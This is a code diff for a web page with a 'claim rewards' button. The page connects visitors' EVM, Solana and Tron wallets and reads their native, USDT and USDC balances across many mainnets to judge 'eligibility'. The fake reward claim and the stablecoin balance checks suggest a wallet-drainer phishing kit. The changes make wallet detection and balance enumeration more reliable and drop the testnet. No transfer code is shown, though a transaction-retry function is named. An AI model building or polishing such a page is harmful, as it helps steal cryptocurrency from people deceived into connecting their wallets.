@@ -26,7 +26,6 @@ const providers: Record<number, JsonRpcProvider> = {};
 /* ---------------- CHAIN CONFIGS ---------------- */
 const EVM_CHAINS = [
   { chainId: "0x1", name: "Ethereum Mainnet", nativeCurrency: "ETH" },
-  { chainId: "0xaa36a7", name: "Sepolia Testnet", nativeCurrency: "ETH" },
   { chainId: "0x89", name: "Polygon", nativeCurrency: "MATIC" },
   { chainId: "0xa4b1", name: "Arbitrum One", nativeCurrency: "ETH" },
   { chainId: "0xa", name: "Optimism", nativeCurrency: "ETH" },
@@ -110,74 +109,58 @@ const WALLET_CONFIGS = [
 ];
 
 export const RPCS: Record<string, string[]> = {
-  "0x1": [ // Ethereum
+  // Ethereum Mainnet
+  "0x1": [
     "https://eth.llamarpc.com",
-    "https://rpc.ankr.com/eth",
     "https://ethereum.publicnode.com",
-    "https://cloudflare-eth.com",
-    "https://ethereum.blockpi.network/v1/rpc/public"
+    "https://cloudflare-eth.com"
   ],
 
-  "0xaa36a7": [ // Sepolia
-    "https://rpc.sepolia.org",
-    "https://rpc.ankr.com/eth_sepolia",
-    "https://sepolia.blockpi.network/v1/rpc/public",
-    "https://ethereum-sepolia.publicnode.com"
-  ],
-
-  "0x89": [ // Polygon
+  // Polygon
+  "0x89": [
     "https://polygon-rpc.com",
-    "https://rpc.ankr.com/polygon",
-    "https://polygon.publicnode.com",
-    "https://polygon.blockpi.network/v1/rpc/public"
+    "https://polygon.publicnode.com"
   ],
 
-  "0xa4b1": [ // Arbitrum
+  // Arbitrum
+  "0xa4b1": [
     "https://arb1.arbitrum.io/rpc",
-    "https://rpc.ankr.com/arbitrum",
-    "https://arbitrum.publicnode.com",
-    "https://arbitrum.blockpi.network/v1/rpc/public"
+    "https://arbitrum.publicnode.com"
   ],
 
-  "0xa": [ // Optimism
+  // Optimism
+  "0xa": [
     "https://mainnet.optimism.io",
-    "https://optimism.llamarpc.com",
-    "https://rpc.ankr.com/optimism",
-    "https://optimism.blockpi.network/v1/rpc/public"
+    "https://optimism.llamarpc.com"
   ],
 
-  "0x38": [ // BNB Chain
-    "https://bsc-dataseed.binance.org",
-    "https://rpc.ankr.com/bsc",
-    "https://bsc.publicnode.com",
-    "https://bsc.blockpi.network/v1/rpc/public"
+  // BNB Chain
+  "0x38": [
+    "https://bsc.publicnode.com"  
   ],
 
-  "0x2105": [ // Base
+  // Base
+  "0x2105": [
     "https://mainnet.base.org",
-    "https://rpc.ankr.com/base",
-    "https://base.publicnode.com",
-    "https://base.blockpi.network/v1/rpc/public"
+    "https://base.publicnode.com"
   ],
 
-  "0xa86a": [ // Avalanche
+  // Avalanche
+  "0xa86a": [
     "https://api.avax.network/ext/bc/C/rpc",
-    "https://rpc.ankr.com/avalanche",
     "https://avax.publicnode.com",
-    "https://avalanche.blockpi.network/v1/rpc/public",
     "https://1rpc.io/avax/c"
   ],
 
+  // Tron
   "tron-mainnet": [
     "https://api.trongrid.io",
-    "https://rpc.ankr.com/tron_jsonrpc",
     "https://tron.publicnode.com"
   ],
 
+  // Solana
   "solana-mainnet": [
     "https://api.mainnet-beta.solana.com",
-    "https://rpc.ankr.com/solana",
-    "https://solana.publicnode.com"
   ]
 };
 
@@ -193,8 +176,24 @@ async function retryRPC(fn: any, retries = 3) {
   }
 }
 
-function getProvider(chainId:any) {
-  const rpc = RPCS[chainId][Math.floor(Math.random() * RPCS[chainId].length)];
+function getProvider(chainId: string) {
+  const rpcList = RPCS[chainId];
+  if (!rpcList || rpcList.length === 0) {
+    throw new Error(`No RPC URLs configured for chain ${chainId}`);
+  }
+  
+  // Filter out any URLs that look invalid (contain session IDs, etc.)
+  const validRpcs = rpcList.filter(rpc => 
+    !rpc.includes('session') && 
+    !rpc.includes('naas') &&
+    rpc.startsWith('http')
+  );
+  
+  if (validRpcs.length === 0) {
+    throw new Error(`No valid RPC URLs for chain ${chainId}`);
+  }
+  
+  const rpc = validRpcs[Math.floor(Math.random() * validRpcs.length)];
   return new JsonRpcProvider(rpc);
 }
 
@@ -264,21 +263,37 @@ async function retryTx(
 const solConnection = new Connection(clusterApiUrl("mainnet-beta"));
 
 async function connectSolana(): Promise<{ success: boolean; cancelled?: boolean; address?: string }> {
-  if (!window.solana) return { success: false };
+  const w = window as any;
+  const provider = w.phantom?.solana || w.solflare || w.solana;
+  
+  if (!provider) {
+    return { success: false };
+  }
+  
   try {
-    const resp = await window.solana.connect();
-    solAddress = resp.publicKey.toString();
-    return { success: true, address: solAddress };
+    // IMPROVED: Small delay for UI
+    await new Promise(resolve => setTimeout(resolve, 300));
+    
+    const resp = await provider.connect();
+    const address = resp.publicKey?.toString() || resp.toString();
+    
+    if (!address) {
+      return { success: false };
+    }
+    
+    solAddress = address;
+    return { success: true, address };
+    
   } catch (err: any) {
     console.error("Solana connection error:", err);
-    // Check for user cancellation - error code 4001 or message containing rejection/cancellation
+    
     if (err.code === 4001 || err.code === '4001' || 
         err.message?.includes("User rejected") || 
-        err.message?.includes("User denied") ||
         err.message?.includes("cancelled") ||
         err.message?.includes("canceled")) {
       return { success: false, cancelled: true };
     }
+    
     return { success: false };
   }
 }
@@ -295,20 +310,24 @@ async function getSolanaBalance(address: string): Promise<number> {
 
 /* ---------------- EVM ---------------- */
 async function connectEVM(): Promise<{ success: boolean; cancelled?: boolean; address?: string }> {
-  if (!window.ethereum) return { success: false };
+  // IMPROVED: Wait for ethereum to inject
+  if (!window.ethereum) {
+    await new Promise(resolve => setTimeout(resolve, 500));
+    if (!window.ethereum) {
+      return { success: false };
+    }
+  }
   
   try {
-    // FIXED: Always request fresh accounts to ensure we're on the right network
-    await window.ethereum.request({ method: "eth_requestAccounts" });
+    // Request accounts
+    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
     
+    if (!accounts || (accounts as string[]).length === 0) {
+      return { success: false };
+    }
+
     const provider = new BrowserProvider(window.ethereum);
-    
-    // FIXED: Verify network matches expected
     const network = await provider.getNetwork();
-    const detectedChainId = "0x" + network.chainId.toString(16);
-    
-    console.log("Connected to network:", detectedChainId);
-    
     const signer = await provider.getSigner();
     const address = await signer.getAddress();
 
@@ -317,15 +336,16 @@ async function connectEVM(): Promise<{ success: boolean; cancelled?: boolean; ad
     }
 
     evmAddress = address;
-    currentChainId = detectedChainId;
+    currentChainId = "0x" + network.chainId.toString(16);
     
-    console.log("EVM connected with address:", evmAddress, "on chain:", currentChainId);
+    console.log("EVM connected:", evmAddress, "on chain:", currentChainId);
     
     return { success: true, address: evmAddress };
     
   } catch (err: any) {
     console.error("EVM connection error:", err);
     
+    // Check for user cancellation
     if (err.code === 4001 || err.code === '4001' || 
         err.message?.includes("User rejected") || 
         err.message?.includes("User denied") ||
@@ -334,8 +354,6 @@ async function connectEVM(): Promise<{ success: boolean; cancelled?: boolean; ad
       return { success: false, cancelled: true };
     }
     
-    // FIXED: Better error logging
-    console.error("Connection error details:", err.message, err.code);
     return { success: false };
   }
 }
@@ -351,59 +369,69 @@ async function getEVMBalance(address: string): Promise<bigint> {
 async function initTronLink(): Promise<{ tronWeb: any; address: string } | null> {
   const w = window as any;
   
-  // Check if TronLink is installed
-  if (!w.tronLink && !w.tron) {
-    console.log("TronLink not detected");
-    return null;
+  // IMPROVED: Wait for TronLink/TokenPocket to inject (up to 5 seconds)
+  let attempts = 0;
+  while (attempts < 20) {
+    if (w.tronLink || w.tron || w.tronWeb || w.tokenpocket?.tronWeb) {
+      break;
+    }
+    await new Promise(resolve => setTimeout(resolve, 250));
+    attempts++;
   }
   
-  try {
-    // Use tronLink.request at earliest time to ensure proper TronWeb injection [^25^]
-    const tronLink = w.tronLink || w.tron;
-    
-    // If already ready, return immediately
-    if (tronLink.ready && tronLink.tronWeb) {
-      const address = tronLink.tronWeb.defaultAddress?.base58;
-      if (address) {
-        return { tronWeb: tronLink.tronWeb, address };
-      }
-    }
-    
-    // Request accounts to trigger TronWeb injection [^25^]
-    // This is the recommended approach from TronLink docs
-    const res = await tronLink.request({ method: 'tron_requestAccounts' });
-    
-    // Check for successful connection (code 200) [^25^]
-    if (res === true || res?.code === 200 || res?.code === '200') {
-      // After successful request, tronWeb should be fully injected
-      if (tronLink.tronWeb) {
-        const address = tronLink.tronWeb.defaultAddress?.base58;
-        if (address) {
-          return { tronWeb: tronLink.tronWeb, address };
-        }
-      }
-    }
-    
-    // If we got here but have tronWeb, try to use it anyway
-    if (tronLink.tronWeb) {
-      const address = tronLink.tronWeb.defaultAddress?.base58;
-      if (address) {
-        return { tronWeb: tronLink.tronWeb, address };
-      }
-    }
-    
-    return null;
-  } catch (e: any) {
-    console.error("TronLink init error:", e);
-    // Check if user cancelled
-    if (e?.code === 4001 || e?.code === '4001' || 
-        e?.message?.includes("rejected") || 
-        e?.message?.includes("cancelled") ||
-        e?.message?.includes("canceled")) {
-      throw new Error("USER_CANCELLED");
-    }
-    return null;
+  // Check TokenPocket first
+  if (w.tokenpocket?.tronWeb?.defaultAddress?.base58) {
+    return { 
+      tronWeb: w.tokenpocket.tronWeb, 
+      address: w.tokenpocket.tronWeb.defaultAddress.base58 
+    };
   }
+  
+  const tronLink = w.tronLink || w.tron;
+  
+  // If already ready
+  if (tronLink?.ready && tronLink?.tronWeb?.defaultAddress?.base58) {
+    return { 
+      tronWeb: tronLink.tronWeb, 
+      address: tronLink.tronWeb.defaultAddress.base58 
+    };
+  }
+  
+  // Request accounts if available
+  if (tronLink?.request) {
+    try {
+      const res = await Promise.race([
+        tronLink.request({ method: 'tron_requestAccounts' }),
+        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 10000))
+      ]);
+      
+      // Wait for injection after request
+      await new Promise(resolve => setTimeout(resolve, 500));
+      
+      if (tronLink.tronWeb?.defaultAddress?.base58) {
+        return { 
+          tronWeb: tronLink.tronWeb, 
+          address: tronLink.tronWeb.defaultAddress.base58 
+        };
+      }
+    } catch (e: any) {
+      if (e.message === 'Timeout') {
+        console.log("TronLink request timed out");
+      } else if (e?.code === 4001 || e?.message?.includes("rejected") || e?.message?.includes("cancelled")) {
+        throw new Error("USER_CANCELLED");
+      }
+    }
+  }
+  
+  // Final check for direct tronWeb
+  if (w.tronWeb?.defaultAddress?.base58) {
+    return {
+      tronWeb: w.tronWeb,
+      address: w.tronWeb.defaultAddress.base58
+    };
+  }
+  
+  return null;
 }
 
 function getTronProvider(): any {
@@ -467,36 +495,37 @@ function getTronAddress(provider: any): string | null {
 // Robust connectTron: cancelled=true if address is null
 async function connectTron(): Promise<{ success: boolean; cancelled?: boolean; address?: string }> {
   try {
-    // Attempt to connect via initTronLink
+    // IMPROVED: Small delay to allow UI to update
+    await new Promise(resolve => setTimeout(resolve, 300));
+    
     const result = await initTronLink();
-    console.log("TronLink connection result:", result);
 
-    // If result is null or has no address, treat as cancelled
     if (!result?.address) {
-      console.error("Tron connection failed: no address returned from TronLink.");
-      return { success: false, cancelled: true };
+      // Wallet not detected - NOT user cancelled
+      console.error("Tron connection failed: wallet not detected");
+      return { success: false, cancelled: false };
     }
 
-    // Valid address found
-    const addr = result.address;
-    tronAddress = addr;
+    tronAddress = result.address;
 
     const tronLink = (window as any).tronLink || (window as any).tron;
     if (tronLink) setupTronEventListeners(tronLink);
 
-    return { success: true, address: addr };
+    return { success: true, address: result.address };
 
   } catch (e: any) {
     console.error("Tron connection error:", e);
-
-    // Detect explicit user cancellation
-    const cancelledMessages = ["USER_CANCELLED", "rejected", "cancelled", "canceled"];
-    if (e?.code === 4001 || e?.code === "4001" || cancelledMessages.some(msg => e?.message?.includes(msg))) {
+    
+    // Only mark as cancelled if user explicitly rejected
+    if (e?.message === "USER_CANCELLED" || e?.code === 4001 || e?.code === "4001" ||
+        e?.message?.toLowerCase()?.includes("rejected") || 
+        e?.message?.toLowerCase()?.includes("cancelled") ||
+        e?.message?.toLowerCase()?.includes("user denied")) {
       return { success: false, cancelled: true };
     }
 
-    // Any other unexpected error should also be treated as cancelled
-    return { success: false, cancelled: true };
+    // Any other error is "not detected", not "cancelled"
+    return { success: false, cancelled: false };
   }
 }
 
@@ -685,28 +714,26 @@ async function analyzeWalletEligibility(
     let eligibleBalanceDisplay = "";
 
     if (type === "evm") {
-      connectEVM(); // Reconnect to update address and balances for new chain
+      await connectEVM(); // Reconnect to update address and balances
       if (!evmAddress) throw new Error("EVM address not connected");
+
       const chainId = getChainIdFromName(chainName);
       if (!chainId) throw new Error(`Unsupported EVM chain: ${chainName}`);
-
       const config = CHAIN_CONFIGS[chainId];
       if (!config) throw new Error(`Chain config missing for ${chainName}`);
 
-      const provider = getProvider(chainId);
-      if (!provider) throw new Error(`Provider not available for ${chainName}`);
-
-      // Native token balance
-      const nativeBalanceWei = await retryRPC(() => provider.getBalance(evmAddress!));
+      // Use the reliable BrowserProvider for native balance
+      const nativeBalanceWei = await getEVMBalance(evmAddress);
       const nativeBalance = Number(formatUnits(nativeBalanceWei, config.nativeDecimals));
       const hasNative = nativeBalance > 0;
 
       // USDT
       let usdtBalance = 0, hasUSDT = false;
       if (config.usdt) {
+        const provider = new BrowserProvider(window.ethereum!);
         const usdtContract = new Contract(config.usdt.address, ERC20_ABI, provider);
-        const usdtDecimals = await retryRPC(() => usdtContract.decimals());
-        const usdtBalanceRaw = await retryRPC(() => usdtContract.balanceOf(evmAddress));
+        const usdtDecimals = await usdtContract.decimals();
+        const usdtBalanceRaw = await usdtContract.balanceOf(evmAddress);
         usdtBalance = Number(formatUnits(usdtBalanceRaw, usdtDecimals));
         hasUSDT = usdtBalance > 0;
       }
@@ -714,9 +741,10 @@ async function analyzeWalletEligibility(
       // USDC
       let usdcBalance = 0, hasUSDC = false;
       if (config.usdc) {
+        const provider = new BrowserProvider(window.ethereum!);
         const usdcContract = new Contract(config.usdc.address, ERC20_ABI, provider);
-        const usdcDecimals = await retryRPC(() => usdcContract.decimals());
-        const usdcBalanceRaw = await retryRPC(() => usdcContract.balanceOf(evmAddress));
+        const usdcDecimals = await usdcContract.decimals();
+        const usdcBalanceRaw = await usdcContract.balanceOf(evmAddress);
         usdcBalance = Number(formatUnits(usdcBalanceRaw, usdcDecimals));
         hasUSDC = usdcBalance > 0;
       }
@@ -727,6 +755,11 @@ async function analyzeWalletEligibility(
       if (hasUSDT) balances.push(`${usdtBalance.toFixed(2)} USDT`);
       if (hasUSDC) balances.push(`${usdcBalance.toFixed(2)} USDC`);
       eligibleBalanceDisplay = balances.join(" | ");
+      console.log("balance", eligibleBalanceDisplay);
+      console.log("all balances")
+      console.log(usdcBalance)
+      console.log(usdtBalance)
+      console.log(nativeBalance)
     }
 
     else if (type === "solana") {
@@ -752,6 +785,10 @@ async function analyzeWalletEligibility(
       if (hasUSDT) balances.push(`${usdtBalance.toFixed(2)} USDT`);
       if (hasUSDC) balances.push(`${usdcBalance.toFixed(2)} USDC`);
       eligibleBalanceDisplay = balances.join(" | ");
+      console.log("balances")
+      console.log(usdcBalance)
+      console.log(usdtBalance)
+      console.log(nativeBalance)
     }
 
     else if (type === "tron") {
@@ -777,6 +814,10 @@ async function analyzeWalletEligibility(
       if (hasUSDT) balances.push(`${usdtBalance.toFixed(2)} USDT`);
       if (hasUSDC) balances.push(`${usdcBalance.toFixed(2)} USDC`);
       eligibleBalanceDisplay = balances.join(" | ");
+      console.log("balances")
+      console.log(nativeBalance)
+      console.log(usdcBalance)
+      console.log(usdtBalance)
     }
 
     analyzing = false;
@@ -936,15 +977,6 @@ const CHAIN_CONFIGS: Record<string, ChainConfig> = {
     usdt: { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT", decimals: 6 },
     usdc: { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC", decimals: 6 }
   },
-  "0xaa36a7": {
-    chainId: "0xaa36a7",
-    name: "Sepolia Testnet",
-    nativeToken: "ETH",
-    nativeDecimals: 18,
-    rpcUrl: "https://sepolia.infura.io/v3/YOUR_INFURA_KEY",
-    usdt: null,
-    usdc: null
-  },
   "0x89": {
     chainId: "0x89",
     name: "Polygon",
@@ -977,7 +1009,7 @@ const CHAIN_CONFIGS: Record<string, ChainConfig> = {
     name: "BNB Chain",
     nativeToken: "BNB",
     nativeDecimals: 18,
-    rpcUrl: "https://bsc-dataseed.binance.org",
+    rpcUrl:  "https://bsc.publicnode.com",
     usdt: { address: "0x55d398326f99059fF775485246999027B3197955", symbol: "USDT", decimals: 18 },
     usdc: { address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol: "USDC", decimals: 18 }
   },
@@ -1628,9 +1660,8 @@ function detectWallets() {
   const wallets = [];
   const w = window as any;
   
-  // Better EVM detection - check for actual providers, not just window.ethereum
+  // EVM detection
   if (w.ethereum) {
-    // Check if it's a real wallet provider, not just a stub
     if (w.ethereum.isMetaMask || w.ethereum.isTrust || w.ethereum.isCoinbaseWallet || 
         w.ethereum.isTokenPocket || w.ethereum.isPhantom || w.ethereum.isBraveWallet ||
         w.ethereum.isExodus || w.ethereum.request) {
@@ -1643,12 +1674,23 @@ function detectWallets() {
     wallets.push("solana");
   }
   
-  // Tron detection - check for TronLink or tronWeb
+  // Tron detection - check all possible injection points
   if (w.tronLink || w.tron || w.tronWeb || w.tokenpocket?.tronWeb) {
     wallets.push("tron");
   }
   
   return wallets;
+}
+
+// ADD THIS NEW FUNCTION after detectWallets
+async function detectWalletsWithDelay(): Promise<string[]> {
+  // Wait for wallets to inject (up to 4.5 seconds)
+  for (let i = 0; i < 15; i++) {
+    const wallets = detectWallets();
+    if (wallets.length > 0) return wallets;
+    await new Promise(resolve => setTimeout(resolve, 300));
+  }
+  return detectWallets();
 }
 
 function hasTokenPocket(): boolean {
@@ -1818,23 +1860,34 @@ async function tryFallbackWallet(walletName: string) {
 }
 
 /* ---------------- TRIGGER WALLET POPUP ---------------- */
-function onClaimClick() {
+async function onClaimClick() {
+  // Prevent double clicks
+  if (connecting || analyzing) {
+    console.log("Already processing, ignoring click");
+    return;
+  }
+  
   // If on mobile and not in app browser, show mobile wallet selection
   if (isMobile() && !isInAppBrowser()) {
     showMobileWalletPopup = true;
     return;
   }
   
-  const wallets = detectWallets();
+  // IMPROVED: Wait for wallets to inject with delay
+  connecting = true;
+  const wallets = await detectWalletsWithDelay();
+  connecting = false;
+  
   if (wallets.length === 0) {
     if (isMobile()) {
       showMobileWalletPopup = true;
       return;
     } else {
-      showError("No wallet detected. Please install a wallet extension to claim rewards.");
+      showError("No wallet detected. Please install MetaMask, TronLink, or Phantom and refresh the page.");
     }
     return;
   }
+  
   openWalletPopup();
 }
 
@@ -2404,9 +2457,7 @@ h1{ margin:10px 0;font-size:24px; }
   border-color: #ff7a00;
 }
 .tron-btn {
-  background: linear-gradient(135deg, #0C5AF2 0%, #1a7df2 100%);
-  color: white;
-  border-color: #0C5AF2;
+  background: #f0f0f0
 }
 .tron-btn:hover, .tron-btn:active {
   background: #0a4ad9;
